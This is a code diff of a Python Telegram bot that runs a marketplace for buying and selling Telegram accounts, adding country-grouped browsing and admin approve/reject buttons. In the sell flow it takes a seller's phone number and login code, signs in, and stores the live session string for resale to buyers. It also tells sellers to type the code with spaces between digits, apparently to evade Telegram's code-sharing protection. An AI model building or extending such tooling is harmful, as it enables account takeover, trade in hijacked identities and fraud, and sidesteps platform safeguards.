@@ -830,21 +830,111 @@ async def _watch_for_otp(bot, user_id: int, session_str: str, phone: str, acc_id
 
 # ── BUY FLOW ──────────────────────────────────────────────────────────────────
 async def buy_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """Show available accounts grouped by country as inline buttons."""
     query = update.callback_query
     await query.answer()
+
     with get_db() as conn:
-        accounts = conn.execute("SELECT id, price FROM accounts WHERE status='available' ORDER BY price ASC").fetchall()
+        # Get all available accounts with their phone numbers
+        accounts = conn.execute(
+            "SELECT id, price, phone FROM accounts WHERE status='available' ORDER BY price ASC"
+        ).fetchall()
+        # Get country_prices for dial code lookup
+        countries = conn.execute(
+            "SELECT country_code, country_name, dial_code FROM country_prices ORDER BY LENGTH(dial_code) DESC"
+        ).fetchall()
+
     if not accounts:
         await query.edit_message_text(
             "╔══════════════════════╗\n     🛒 *MARKETPLACE*\n╚══════════════════════╝\n\n"
             "😔 No accounts available right now.\nCheck back soon!",
-            parse_mode="Markdown", reply_markup=back_keyboard()); return
-    buttons = [[InlineKeyboardButton(f"🔑 Account #{a['id']}  —  ${a['price']:.2f}", callback_data=f"view_{a['id']}")] for a in accounts]
+            parse_mode="Markdown", reply_markup=back_keyboard())
+        return
+
+    # Group accounts by country using dial code matching
+    def get_country(phone):
+        p = phone.strip().lstrip("+")
+        for c in countries:
+            if p.startswith(c["dial_code"]):
+                return c["country_code"], c["country_name"], c["dial_code"]
+        return "XX", "Other", "0"
+
+    country_counts = {}  # {country_code: {name, dial, count, price_min}}
+    for acc in accounts:
+        code, name, dial = get_country(acc["phone"] or "")
+        if code not in country_counts:
+            country_counts[code] = {"name": name, "dial": dial, "count": 0, "price": float(acc["price"])}
+        country_counts[code]["count"] += 1
+        country_counts[code]["price"] = min(country_counts[code]["price"], float(acc["price"]))
+
+    # Build one button per country
+    buttons = []
+    for code, info in sorted(country_counts.items(), key=lambda x: x[1]["name"]):
+        flag = country_flag(code)
+        label = f"+{info['dial']} : {flag} {info['name']} [ {info['count']} Available ]"
+        buttons.append([InlineKeyboardButton(label, callback_data=f"buycountry_{code}")])
+
     buttons.append([InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back")])
+
+    total = sum(v["count"] for v in country_counts.values())
     await query.edit_message_text(
         f"╔══════════════════════╗\n     🛒 *MARKETPLACE*\n╚══════════════════════╝\n\n"
-        f"📦 *{len(accounts)} account(s) available*\n\nTap any listing to view details:",
-        parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(buttons))
+        f"📦 *{total} account(s) available*\n\n"
+        f"Select a country to browse accounts:",
+        parse_mode="Markdown",
+        reply_markup=InlineKeyboardMarkup(buttons))
+
+
+async def buy_country(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """Show individual accounts for a selected country."""
+    query = update.callback_query
+    await query.answer()
+    country_code = query.data.split("buycountry_")[1]
+
+    with get_db() as conn:
+        # Get country info
+        country = conn.execute(
+            "SELECT country_name, dial_code FROM country_prices WHERE country_code=%s",
+            (country_code,)
+        ).fetchone()
+        # Get available accounts for this country by matching dial code
+        all_accs = conn.execute(
+            "SELECT id, price, phone FROM accounts WHERE status='available' ORDER BY price ASC"
+        ).fetchall()
+
+    if country:
+        dial = country["dial_code"]
+        name = country["country_name"]
+        flag = country_flag(country_code)
+    else:
+        dial, name, flag = "0", "Other", "🌍"
+
+    # Filter accounts matching this country's dial code
+    accs = [a for a in all_accs if (a["phone"] or "").strip().lstrip("+").startswith(dial)]
+
+    if not accs:
+        await query.edit_message_text(
+            f"😔 No {flag} {name} accounts available right now.",
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("🔙 Back", callback_data="menu_buy")]
+            ]))
+        return
+
+    buttons = []
+    for a in accs:
+        buttons.append([InlineKeyboardButton(
+            f"🔑 Account #{a['id']}  —  ${a['price']:.2f}",
+            callback_data=f"view_{a['id']}"
+        )])
+    buttons.append([InlineKeyboardButton("🔙 Back", callback_data="menu_buy")])
+
+    await query.edit_message_text(
+        f"╔══════════════════════╗\n     🛒 *MARKETPLACE*\n╚══════════════════════╝\n\n"
+        f"{flag} *{name}* accounts\n"
+        f"📦 *{len(accs)} available*\n\n"
+        f"Tap any account to view details:",
+        parse_mode="Markdown",
+        reply_markup=InlineKeyboardMarkup(buttons))
 
 async def view_account(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -1014,6 +1104,7 @@ async def cmd_prices(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
 # ── ADMIN PRICE PANEL ─────────────────────────────────────────────────────────
 (APANEL_ADD_WAITING, APANEL_EDIT_WAITING, APANEL_DEL_CONFIRM) = range(10, 13)
+SELL_APPROVE_PRICE = 13  # state: admin enters price after approving a sell submission
 
 def _prices_panel_keyboard(rows):
     """Build the admin price panel keyboard."""
@@ -1267,58 +1358,16 @@ async def sell_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     await query.edit_message_text(
-        "<b>SELL ACCOUNT</b>\n\n"
-        "Want to sell your Telegram account and earn money?\n\n"
-        "Check /prices to see how much we pay per country.\n\n"
-        "<b>How to sell:</b>\n"
-        "1. Check /prices for your country\n"
-        "2. Send your phone number below\n"
-        "3. Enter the OTP we send you\n"
-        "4. We verify and list your account\n"
-        "5. Get paid when it sells!\n\n"
-        "Ready? Send your phone number with country code.\n"
-        "Example: <code>+12345678900</code>\n\n"
+        "📱 Send your phone number with country code.\n\n"
+        "Example: <code>+919876543210</code>\n\n"
+        "Check /prices to see payouts per country.\n\n"
         "Type /cancel to go back.",
         parse_mode="HTML",
         reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("View Prices", callback_data="sell_prices")],
-            [InlineKeyboardButton("Back to Menu", callback_data="menu_back")]
+            [InlineKeyboardButton("🔙 Back to Menu", callback_data="menu_back")]
         ])
     )
     return SELL_PHONE
-
-
-async def sell_prices_inline(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    """Show prices from inline button inside sell conversation."""
-    query = update.callback_query
-    await query.answer()
-    with get_db() as conn:
-        rows = conn.execute(
-            "SELECT country_code, country_name, price FROM country_prices ORDER BY country_name ASC"
-        ).fetchall()
-    if not rows:
-        await query.answer("No prices set yet. Contact support.", show_alert=True)
-        return SELL_PHONE
-    lines = ["<b>Account Payout Prices</b>", "=" * 30]
-    for r in rows:
-        lines.append(
-            f"<b>{r['country_name']}</b> (<code>{r['country_code']}</code>)"
-            f" — <b>${r['price']:.2f}</b>"
-        )
-    lines.append("\nSend your phone number to proceed.")
-    await query.edit_message_text(
-        "\n".join(lines),
-        parse_mode="HTML",
-        reply_markup=InlineKeyboardMarkup([
-            [InlineKeyboardButton("Back", callback_data="sell_back")]
-        ])
-    )
-    return SELL_PHONE
-
-
-async def sell_back_inline(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    """Go back to sell menu from prices view."""
-    return await sell_menu(update, ctx)
 
 
 async def sell_get_phone(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
@@ -1344,7 +1393,8 @@ async def sell_get_phone(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"📩 <b>OTP Sent!</b>\n\n"
             f"A login code was sent to <code>{phone}</code>.\n\n"
-            f"Please enter the OTP you received (digits only, e.g. <code>12345</code>):",
+            f"Enter the OTP with spaces between each digit.\n\n"
+            f"Example: <code>1 2 3 4 5</code>",
             parse_mode="HTML")
         return SELL_OTP
     except Exception as e:
@@ -1356,8 +1406,10 @@ async def sell_get_phone(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             reply_markup=main_menu_keyboard())
         return ConversationHandler.END
 
+
 async def sell_get_otp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    """User sent OTP — sign in and save session, notify admin."""
+    """User sent OTP — sign in, save session, notify admin with approve/reject buttons."""
+    # Accept both spaced "1 2 3 4 5" and plain "12345"
     otp       = update.message.text.strip().replace(" ", "")
     client    = ctx.user_data.get("sell_client")
     phone     = ctx.user_data.get("sell_phone")
@@ -1375,22 +1427,8 @@ async def sell_get_otp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         await client.sign_in(phone, otp, phone_code_hash=code_hash)
         session_string = client.session.save()
         await client.disconnect()
-        ctx.user_data["sell_session"] = session_string
 
-        # Notify admin with full details to review and set a price
-        await update.message.bot.send_message(
-            ADMIN_ID,
-            f"📥 <b>NEW ACCOUNT FOR SALE</b>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"👤 Seller: @{user.username or user.first_name} (<code>{user.id}</code>)\n"
-            f"📱 Phone: <code>{phone}</code>\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"To list this account, use:\n"
-            f"<code>/add_sell {user.id}</code>",
-            parse_mode="HTML"
-        )
-
-        # Store pending sell in DB for admin to approve
+        # Store pending sell in DB
         with get_db() as conn:
             new_acc = conn.execute(
                 "INSERT INTO accounts (session, phone, price, status) VALUES (%s,%s,%s,'pending_review') RETURNING id",
@@ -1398,26 +1436,47 @@ async def sell_get_otp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             ).fetchone()
             acc_id = new_acc["id"]
 
-        # Post to trades channel
         flag, country_name = phone_to_country(phone)
+        seller_name = f"@{user.username}" if user.username else user.first_name
+
+        # Admin message with inline Approve / Reject buttons
+        admin_kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("✅ Approve", callback_data=f"sell_approve_{acc_id}"),
+             InlineKeyboardButton("❌ Reject",  callback_data=f"sell_reject_{acc_id}")]
+        ])
+        await update.message.bot.send_message(
+            ADMIN_ID,
+            f"📥 <b>NEW ACCOUNT FOR SALE</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"🆔 Account ID: <code>#{acc_id}</code>\n"
+            f"👤 Seller: {seller_name} (<code>{user.id}</code>)\n"
+            f"📱 Phone: <code>{phone}</code>\n"
+            f"🌍 Country: {flag} {country_name}\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"Approve to list it in the marketplace, or Reject to remove it.",
+            parse_mode="HTML",
+            reply_markup=admin_kb
+        )
+
+        # Channel notification
         await send_to_channel(update.message.bot, TRADES_CHANNEL,
             f"💰 <b>NEW ACCOUNT SUBMITTED FOR SALE</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━━\n"
             f"🆔 Account ID: <code>#{acc_id}</code>\n"
-            f"🌍 Country {flag} {country_name}\n"
-            f"� Phone: <code>{mask_phone(phone)}</code>\n"
-            f"👤 Seller: @{user.username or user.first_name} (<code>{user.id}</code>)\n"
+            f"🌍 Country: {flag} {country_name}\n"
+            f"📱 Phone: <code>{mask_phone(phone)}</code>\n"
+            f"👤 Seller: {seller_name} (<code>{user.id}</code>)\n"
             f"📊 Status: 🔄 Pending Review\n"
             f"━━━━━━━━━━━━━━━━━━━━━━"
         )
 
         await update.message.reply_text(
             f"✅ <b>Account Submitted!</b>\n\n"
-            f"📱 Phone: <code>{phone}</code>\n\n"
+            f"📱 Phone: <code>{phone}</code>\n"
+            f"🌍 Country: {flag} {country_name}\n\n"
             f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"Your account has been sent to the admin for review.\n"
-            f"Once approved and priced, it will be listed in the marketplace.\n\n"
-            f"You'll be notified when it sells! 💰",
+            f"Your account is pending admin review.\n"
+            f"You'll be notified once it's approved and listed. 💰",
             parse_mode="HTML",
             reply_markup=main_menu_keyboard())
         return ConversationHandler.END
@@ -1431,9 +1490,109 @@ async def sell_get_otp(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             reply_markup=main_menu_keyboard())
         return ConversationHandler.END
 
+
+async def sell_approve_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """Admin taps ✅ Approve on a sell submission — asks for price."""
+    query = update.callback_query
+    if query.from_user.id != ADMIN_ID:
+        await query.answer("Not authorised.", show_alert=True)
+        return ConversationHandler.END
+    acc_id = int(query.data.split("sell_approve_")[1])
+    with get_db() as conn:
+        acc = conn.execute(
+            "SELECT * FROM accounts WHERE id=%s AND status='pending_review'", (acc_id,)
+        ).fetchone()
+    if not acc:
+        await query.answer("Not found or already processed.", show_alert=True)
+        return ConversationHandler.END
+    ctx.user_data["sell_approve_acc_id"] = acc_id
+    await query.answer()
+    await query.edit_message_text(
+        f"✅ Approving account <code>#{acc_id}</code>\n\n"
+        f"📱 Phone: <code>{acc['phone']}</code>\n\n"
+        f"Enter the listing price in USD (e.g. <code>5.00</code>):",
+        parse_mode="HTML"
+    )
+    return SELL_APPROVE_PRICE
+
+
+async def sell_approve_price(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """Admin sent the price after approving a sell submission."""
+    if update.effective_user.id != ADMIN_ID:
+        return ConversationHandler.END
+    acc_id = ctx.user_data.get("sell_approve_acc_id")
+    if not acc_id:
+        await update.message.reply_text("❌ No pending approval. Use the Approve button.")
+        return ConversationHandler.END
+    try:
+        price = float(update.message.text.strip().replace("$", ""))
+        if price <= 0:
+            raise ValueError
+    except ValueError:
+        await update.message.reply_text("❌ Invalid price. Enter a number like <code>5.00</code>", parse_mode="HTML")
+        return SELL_APPROVE_PRICE
+    with get_db() as conn:
+        acc = conn.execute("SELECT * FROM accounts WHERE id=%s", (acc_id,)).fetchone()
+        if not acc:
+            await update.message.reply_text(f"❌ Account #{acc_id} not found.")
+            return ConversationHandler.END
+        conn.execute(
+            "UPDATE accounts SET price=%s, status='available' WHERE id=%s",
+            (price, acc_id)
+        )
+    ctx.user_data.pop("sell_approve_acc_id", None)
+    flag, country_name = phone_to_country(acc["phone"] or "")
+    await update.message.reply_text(
+        f"✅ Account <code>#{acc_id}</code> approved and listed at <b>${price:.2f}</b>",
+        parse_mode="HTML"
+    )
+    await send_to_channel(ctx.bot, TRADES_CHANNEL,
+        f"✅ <b>ACCOUNT APPROVED &amp; LISTED</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🆔 Account ID: <code>#{acc_id}</code>\n"
+        f"🌍 Country: {flag} {country_name}\n"
+        f"📱 Phone: <code>{mask_phone(acc['phone'] or '')}</code>\n"
+        f"💵 Price: <b>${price:.2f}</b>\n"
+        f"📊 Status: 🟢 Available\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━"
+    )
+    return ConversationHandler.END
+
+
+async def sell_reject_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
+    """Admin taps ❌ Reject on a sell submission."""
+    query = update.callback_query
+    if query.from_user.id != ADMIN_ID:
+        await query.answer("Not authorised.", show_alert=True)
+        return
+    acc_id = int(query.data.split("sell_reject_")[1])
+    with get_db() as conn:
+        acc = conn.execute(
+            "SELECT * FROM accounts WHERE id=%s AND status='pending_review'", (acc_id,)
+        ).fetchone()
+        if not acc:
+            await query.answer("Not found or already processed.", show_alert=True)
+            return
+        conn.execute("DELETE FROM accounts WHERE id=%s", (acc_id,))
+    await query.edit_message_text(
+        f"❌ Account <code>#{acc_id}</code> rejected and removed.",
+        parse_mode="HTML"
+    )
+    await query.answer("❌ Rejected.")
+    # Channel notification
+    flag, country_name = phone_to_country(acc["phone"] or "")
+    await send_to_channel(ctx.bot, TRADES_CHANNEL,
+        f"❌ <b>ACCOUNT REJECTED</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🆔 Account ID: <code>#{acc_id}</code>\n"
+        f"🌍 Country: {flag} {country_name}\n"
+        f"📊 Status: ❌ Rejected\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━"
+    )
+
+
 async def sell_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     """Cancel sell conversation."""
-    # Disconnect any open Telethon client
     client = ctx.user_data.get("sell_client")
     if client:
         try:
@@ -1764,8 +1923,6 @@ def build_app() -> Application:
         states={
             SELL_PHONE: [
                 MessageHandler(filters.TEXT & ~filters.COMMAND, sell_get_phone),
-                CallbackQueryHandler(sell_prices_inline, pattern="^sell_prices$"),
-                CallbackQueryHandler(sell_back_inline,   pattern="^sell_back$"),
             ],
             SELL_OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, sell_get_otp)],
         },
@@ -1789,11 +1946,24 @@ def build_app() -> Application:
         per_message=False,
         allow_reentry=True,
     )
+    # Admin sell approve conversation (approve button → enter price)
+    sell_approve_conv = ConversationHandler(
+        entry_points=[CallbackQueryHandler(sell_approve_cb, pattern=r"^sell_approve_\d+$")],
+        states={
+            SELL_APPROVE_PRICE: [
+                MessageHandler(filters.TEXT & ~filters.COMMAND & filters.User(ADMIN_ID), sell_approve_price)
+            ],
+        },
+        fallbacks=[CommandHandler("cancel", cancel)],
+        per_message=False,
+        allow_reentry=True,
+    )
     app.add_handler(CommandHandler("start",    start))
     app.add_handler(deposit_conv)
     app.add_handler(withdraw_conv)
     app.add_handler(login_conv)
     app.add_handler(sell_conv)
+    app.add_handler(sell_approve_conv)
     app.add_handler(apanel_conv)
     app.add_error_handler(error_handler)
     app.add_handler(CommandHandler("accounts",    admin_accounts))
@@ -1807,6 +1977,8 @@ def build_app() -> Application:
     # Withdrawal inline approve/reject buttons
     app.add_handler(CallbackQueryHandler(wd_approve, pattern=r"^wd_approve_\d+$"))
     app.add_handler(CallbackQueryHandler(wd_reject,  pattern=r"^wd_reject_\d+$"))
+    # Sell inline reject button (approve is handled by sell_approve_conv above)
+    app.add_handler(CallbackQueryHandler(sell_reject_cb, pattern=r"^sell_reject_\d+$"))
     app.add_handler(CommandHandler("add_sell",    admin_add_sell))
     app.add_handler(CommandHandler("prices",      cmd_prices))
     app.add_handler(MessageHandler(filters.Regex(r"^/wd_approve_\d+$") & filters.User(ADMIN_ID), wd_approve))
@@ -1822,6 +1994,7 @@ def build_app() -> Application:
     app.add_handler(MessageHandler(filters.Regex(r"^/reject_\d+$")  & filters.User(ADMIN_ID), admin_reject))
     app.add_handler(MessageHandler(filters.Regex(r"^/del_\d+$")     & filters.User(ADMIN_ID), admin_delete))
     app.add_handler(CallbackQueryHandler(buy_menu,      pattern="^menu_buy$"))
+    app.add_handler(CallbackQueryHandler(buy_country,   pattern=r"^buycountry_"))
     app.add_handler(CallbackQueryHandler(view_account,  pattern=r"^view_\d+$"))
     app.add_handler(CallbackQueryHandler(confirm_buy,   pattern=r"^confirm_\d+$"))
     app.add_handler(CallbackQueryHandler(show_balance,  pattern="^menu_balance$"))
